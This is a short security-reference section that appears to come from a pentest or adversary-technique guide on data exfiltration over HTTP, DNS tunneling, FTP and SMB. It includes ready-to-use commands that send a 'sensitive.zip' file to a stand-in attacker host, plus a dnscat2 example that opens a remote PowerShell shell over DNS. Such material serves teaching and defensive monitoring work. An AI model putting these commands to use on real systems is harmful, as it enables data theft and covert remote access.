# Exfiltration - Data Exfiltration Methods

This section outlines common methods used by adversaries to exfiltrate data from compromised networks.

## Common Exfiltration Methods

Data Exfiltration consists of techniques that adversaries may use to steal data from a network. Once collected, adversaries often package the data in a way that makes it easier to remove from the network and less likely to be detected.

*   **HTTP/HTTPS:** Transferring files over standard web protocols (HTTP/HTTPS) is a common exfiltration method as it often blends in with legitimate network traffic.
    *   **Linux (using curl):**
        ```bash
        curl -F "file=@/path/to/sensitive.zip" http://attacker_ip/upload.php
        ```
    *   **Windows (using PowerShell):**
        ```powershell
        Invoke-WebRequest -Uri http://attacker_ip/upload.php -Method POST -InFile C:\Path\To\sensitive.zip
        ```

*   **DNS Tunneling:** This technique involves encoding data within DNS queries and responses, allowing for covert communication and data exfiltration, especially in environments with strict firewall rules.
    ```bash
    # Example (requires a DNS tunneling tool like Iodine or Dnscat2)
    # On victim:
    dnscat2-client --exec "powershell.exe" attacker.com
    # On attacker:
    dnscat2 --dns "domain=attacker.com,host=0.0.0.0"
    ```

*   **FTP/SFTP:** File Transfer Protocol (FTP) and SSH File Transfer Protocol (SFTP) can be used to transfer files to an attacker-controlled server.
    ```bash
    ftp attacker_ip
    put sensitive.zip
    ```

*   **SMB:** Server Message Block (SMB) can be used to copy files to an attacker-controlled SMB share.
    ```powershell
    copy C:\Path\To\sensitive.zip \\attacker_ip\share
    ```

These methods highlight the diverse ways data can be exfiltrated, emphasizing the need for robust data loss prevention (DLP) and network monitoring solutions.

